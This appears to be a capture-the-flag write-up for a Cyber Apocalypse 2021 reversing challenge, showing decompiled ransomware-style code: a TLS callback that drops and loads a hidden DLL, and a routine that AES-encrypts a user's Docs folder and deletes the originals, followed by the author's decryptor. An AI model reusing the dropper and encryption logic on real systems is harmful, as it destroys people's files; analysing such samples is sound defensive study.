# Cyber Apocalypse 2021 Backdoor Write Up

## Details:
Points: 300

Jeopardy style CTF

Category: Reverse Engineering

Comments:

```
One of our friends has left a backdoor on the extraterrestrials' server. If we manage to take advantage of it, we will be able to control all the doors and lock them outside or open doors to facilites we have no access.
This challenge will raise 43 euros for a good cause.
```

## Write up:

The main function of alienware was:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3;
  __int64 v5; 
  __int64 v6;
  char v7; 
  WCHAR Buffer[1024];

  v5 = 0i64;
  v6 = 0i64;
  v7 = 0;
  memset(Buffer, 0, sizeof(Buffer));
  GetEnvironmentVariableW(L"OS", Buffer, 0x3FFu);
  v3 = -1i64;
  do
    ++v3;
  while ( Buffer[v3] );
  LOBYTE(v5) = LOBYTE(Buffer[0]) ^ 0x78;
  BYTE1(v5) = LOBYTE(Buffer[1 % v3]) ^ 2;
  BYTE2(v5) = LOBYTE(Buffer[2 % v3]) ^ 0x76;
  BYTE3(v5) = LOBYTE(Buffer[3 % v3]) ^ 0x80;
  BYTE4(v5) = LOBYTE(Buffer[4 % v3]) ^ 0xF5;
  BYTE5(v5) = LOBYTE(Buffer[5 % v3]) ^ 0x44;
  BYTE6(v5) = LOBYTE(Buffer[6 % v3]) ^ 0xAA;
  HIBYTE(v5) = LOBYTE(Buffer[7 % v3]) ^ 0x98;
  LOBYTE(v6) = LOBYTE(Buffer[8 % v3]) ^ 0xEE;
  BYTE1(v6) = LOBYTE(Buffer[9 % v3]) ^ 0x65;
  BYTE2(v6) = LOBYTE(Buffer[0xA % v3]) ^ 0x11;
  BYTE3(v6) = LOBYTE(Buffer[0xB % v3]) ^ 0x76;
  BYTE4(v6) = LOBYTE(Buffer[0xC % v3]) ^ 0x78;
  BYTE5(v6) = LOBYTE(Buffer[0xD % v3]) ^ 2;
  BYTE6(v6) = LOBYTE(Buffer[0xE % v3]) ^ 0x76;
  HIBYTE(v6) = LOBYTE(Buffer[0xF % v3]) ^ 0x80;
  qword_140005750(&v5);
  FreeLibrary(hLibModule);
  DeleteFileA(::Buffer);
  return 0;
}
```

The program reads the OS environment variable which is "Windows_NT" and then does some operations on that to get a string of size 16. It then passes that string into a function that we cannot see with static analysis. 

I also found a callback function that was run before the main function:

```c
void TlsCallback_0()
{
  HRSRC v0;
  HGLOBAL v1; 
  size_t v2; 
  _BYTE *v3; 
  char *v4; 
  unsigned int v5; 
  const void *v6; 
  char *v7; 
  signed __int64 v8;
  unsigned __int64 v9;
  FILE *v10; 
  CHAR Buffer[272];

  if ( dword_140005734 != 1 )
  {
    v0 = FindResourceW(0i64, (LPCWSTR)0x66, L"BIN");
    v1 = LoadResource(0i64, v0);
    v2 = SizeofResource(0i64, v0);
    v3 = LockResource(v1);
    v4 = (char *)VirtualAlloc(0i64, (unsigned int)v2, 0x1000u, 4u);
    v5 = 0;
    v6 = v4;
    if ( (_DWORD)v2 )
    {
      v7 = v4;
      v8 = v3 - v4;
      do
      {
        v9 = (int)v5;
        ++v7;
        ++v5;
        *(v7 - 1) = v7[v8 - 1] ^ byte_140003280[v9 % 0xC];
      }
      while ( v5 < (unsigned int)v2 );
    }
    memset(Buffer, 0, 0x104ui64);
    GetTempPathA(0x104u, Buffer);
    sub_140001010(::Buffer, "%s%s");
    v10 = fopen(::Buffer, "wb");
    fwrite(v6, 1ui64, v2, v10);
    fclose(v10);
    hLibModule = LoadLibraryA(::Buffer);
    encryptFiles = (__int64 (__fastcall *)(_QWORD))GetProcAddress(hLibModule, "encryptFiles");
    dword_140005734 = 1;
  }
}
```

This function writes a file to the operating system and then uses LoadLibraryA to inject the library into the original process. Then it grabs a function from what at this point I was guessing was a dll using GetProcAddress. Doing some more analysis it becomes obvious that the function pointer we get here is what is used in the main function with the string we create. I then extracted the dll and started reversing that.

I started off by finding the exported function we reference in the main .exe:

```c
__int64 __fastcall encryptFiles(char *a1)
{
  HANDLE v2;
  DWORD pcbBuffer[4];
  struct _WIN32_FIND_DATAW FindFileData; 
  WCHAR Buffer[264]; 
  WCHAR FileName[2048]; 
  WCHAR v8[2048]; 
  WCHAR v9[2048]; 

  pcbBuffer[0] = 257;
  GetUserNameW(Buffer, pcbBuffer);
  memset(v8, 0, sizeof(v8));
  wsprintfW(v8, L"C:\\Users\\%s\\Docs", Buffer);
  wsprintfW(FileName, L"%s\\*.*", v8);
  v2 = FindFirstFileW(FileName, &FindFileData);
  if ( v2 != (HANDLE)-1i64 )
  {
    do
    {
      if ( (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1])
        && (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2]) )
      {
        wsprintfW(FileName, L"%s\\%s", v8, FindFileData.cFileName);
        wsprintfW(v9, L"%s.alien", FileName, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) == 0 )
        {
          sub_1800011C0(FileName, v9, a1);
          wremove(FileName);
        }
      }
    }
    while ( FindNextFileW(v2, &FindFileData) );
    FindClose(v2);
  }
  return 0i64;
}
```

This function seems to go to the path of C:\\Users\\\<current user\>\\Docs and then loops through and tries to encrypt everything that isn't the . or .. directory. After encrypting it seems to add the .alien component to the file.

It then calls a function for each file which takes the original file name, the new file name, and the string that we created in the main function of the original exe.

Opening the true encryption function I see:

```c
__int64 __fastcall sub_1800011C0(LPCWSTR lpFileName, LPCWSTR a2, char *Source)
{
  int v5; 
  HANDLE v6; 
  HANDLE v7; 
  DWORD v8; 
  BOOL v10;
  int v11; 
  DWORD i; 
  DWORD NumberOfBytesRead; 
  HCRYPTPROV phProv; 
  DWORD NumberOfBytesWritten;
  HCRYPTHASH phHash; 
  HCRYPTKEY phKey; 
  __int64 Buffer; 
  __int64 v19; 
  __int64 v20; 
  __int64 v21; 
  __int64 v22;
  __int64 v23; 
  wchar_t Dest[4]; 
  __int64 v25; 
  __int64 v26; 
  __int64 v27; 
  __int16 v28;
  WCHAR szProvider[8]; 
  __int128 v30; 
  __int128 v31; 
  __int128 v32; 
  __int128 v33; 
  __int128 v34; 
  __int64 v35; 
  int v36; 

  *(_QWORD *)Dest = 0i64;
  v25 = 0i64;
  v26 = 0i64;
  v27 = 0i64;
  v28 = 0;
  mbstowcs(Dest, Source, 0x10ui64);
  v5 = lstrlenW(Dest);
  v6 = CreateFileW(lpFileName, 0x80000000, 1u, 0i64, 3u, 0x8000000u, 0i64);
  if ( v6 == (HANDLE)-1i64 )
    return 0xFFFFFFFFi64;
  v7 = CreateFileW(a2, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
  if ( v7 == (HANDLE)-1i64 )
    return 0xFFFFFFFFi64;
  *(_OWORD *)szProvider = xmmword_180003290;
  v31 = xmmword_1800032B0;
  v30 = xmmword_1800032A0;
  v33 = xmmword_1800032D0;
  v32 = xmmword_1800032C0;
  v35 = 0x65006400690076i64;
  v34 = xmmword_1800032E0;
  v36 = 114;
  if ( !CryptAcquireContextW(&phProv, 0i64, szProvider, 0x18u, 0xF0000000)
    || !CryptCreateHash(phProv, 0x800Cu, 0i64, 0, &phHash) )
  {
    goto LABEL_4;
  }
  if ( !CryptHashData(phHash, (const BYTE *)Dest, v5, 0) )
  {
    GetLastError();
    return 0xFFFFFFFFi64;
  }
  if ( !CryptDeriveKey(phProv, 0x660Eu, phHash, 0, &phKey) )
  {
LABEL_4:
    v8 = GetLastError();
    CryptReleaseContext(phProv, 0);
    return v8;
  }
  NumberOfBytesRead = 0;
  Buffer = 0i64;
  v19 = 0i64;
  v20 = 0i64;
  v10 = 0;
  v21 = 0i64;
  v11 = 0;
  v22 = 0i64;
  v23 = 0i64;
  for ( i = GetFileSize(v6, 0i64); ReadFile(v6, &Buffer, 0x30u, &NumberOfBytesRead, 0i64); v23 = 0i64 )
  {
    if ( !NumberOfBytesRead )
      break;
    v11 += NumberOfBytesRead;
    if ( v11 == i )
      v10 = 1;
    if ( !CryptEncrypt(phKey, 0i64, v10, 0, (BYTE *)&Buffer, &NumberOfBytesRead, 0x30u) )
      break;
    NumberOfBytesWritten = 0;
    if ( !WriteFile(v7, &Buffer, NumberOfBytesRead, &NumberOfBytesWritten, 0i64) )
      break;
    Buffer = 0i64;
    v19 = 0i64;
    v20 = 0i64;
    v21 = 0i64;
    v22 = 0i64;
  }
  CryptReleaseContext(phProv, 0);
  CryptDestroyKey(phKey);
  CryptDestroyHash(phHash);
  CloseHandle(v6);
  CloseHandle(v7);
  return 1i64;
}
```

Looking through this function we can see that they open the original file and the file they want to write to. They then acquire lots of things needed for crypt, using the string we passed from main for CryptHashData. They then derive the key from that. They then encrypt the data a block at a time while writing the file. Then they release all the memory and exit.

Looking through MSDN I found out that as long as I had the original string as well as the cryptographic provider. I saw that the provider was being instantiated using some xmmword so I look at what they were:

```
.rdata:0000000180003290 xmmword_180003290 xmmword 66006F0073006F007200630069004Dh
.rdata:00000001800032A0 xmmword_1800032A0 xmmword 63006E00610068006E004500200074h
.rdata:00000001800032B0 xmmword_1800032B0 xmmword 610020004100530052002000640065h   
.rdata:00000001800032C0 xmmword_1800032C0 xmmword 43002000530045004100200064006Eh
.rdata:00000001800032D0 xmmword_1800032D0 xmmword 6100720067006F0074007000790072h
.rdata:00000001800032E0 xmmword_1800032E0 xmmword 6F0072005000200063006900680070h
.rdata:00000001800032F0 qword_1800032F0 dq 65006400690076h 
.rdata:00000001800032F8 dword_1800032F8 dd 72h
```

Turning the hex into ascii I saw that it used:

```
Microsoft Enhanced RSA and AES Cryptographic Provider
```

I then wrote the following c++ program:

```c++
#include <iostream>
#include <Windows.h>
#include <WinBase.h>
#include <wincrypt.h>

#pragma comment (lib, "advapi32")


int main()
{
    // Declarations
    HCRYPTPROV phProv;
    DWORD NumberOfBytesRead = 0;
    DWORD NumberOfBytesWritten = 0;
    HCRYPTHASH phHash;
    HCRYPTKEY phKey;
    BYTE Buffer[1024] = { 0 };
    int v11 = 0;
    int v10 = 0;
    int v5;
    HANDLE v6;
    HANDLE v7;

    // Set size of crypt string
    v5 = 0x10u;

    // Acquire context
    if (!CryptAcquireContextW(&phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 24, 0xF0000000)) exit(1);

    // Create the hash
    if (!CryptCreateHash(phProv, 0x800Cu, 0, 0, &phHash)) exit(1);

    // Create the hash data using string derived from main function
    if (!CryptHashData(phHash, (const BYTE*)"\x2F\x00\x6B\x00\x18\x00\xE4\x00\x9A\x00\x33\x00\xD9\x00\xC7\x00\xA0\x00\x31\x00\x46\x00\x1F\x00\x16\x00\x66\x00\x19\x00\xF7\x00", v5, 0)) exit(1);

    // Derive key from hash
    if (!CryptDeriveKey(phProv, 0x660Eu, phHash, 0, &phKey)) exit(1);

    // Open encrypted file
    v6 = CreateFileW(L"Confidential.pdf.alien", 0x80000000, 1, 0, 3, (unsigned int)0x80000000, 0);

    // Open file to write to
    v7 = CreateFileW(L"Confidential.pdf", (unsigned int)0x40000000, 0, 0, 2, 0x80, 0);

    // Loop through the file in chunks
    for (DWORD i = GetFileSize(v6, 0); ReadFile(v6, Buffer, 0x30u, &NumberOfBytesRead, 0);)
    {
        // if no bytes are read then break
        if (!NumberOfBytesRead) break;

        // append number of bytes read to total count
        v11 += NumberOfBytesRead;

        // if all bytes are read then set final to true, from MSDN docs
        if (v11 == i) v10 = 1;

        // Decrypt the block
        CryptDecrypt(phKey, 0, v10, 0, (BYTE*)Buffer, &NumberOfBytesRead);

        // empty out bytes
        NumberOfBytesWritten = 0;

        // write file
        WriteFile(v7, Buffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);

        // clear buffer
        ZeroMemory(&Buffer, sizeof(Buffer));

    }

    // release all memory
    CryptReleaseContext(phProv, 0);
    CryptDestroyKey(phKey);
    CryptDestroyHash(phHash);
    CloseHandle(v6);
    CloseHandle(v7);

}
```

When run I got the decrypted pdf which contained the flag:

```
CHTB{3nh4nc3d_al1en_m@lwar3!}
```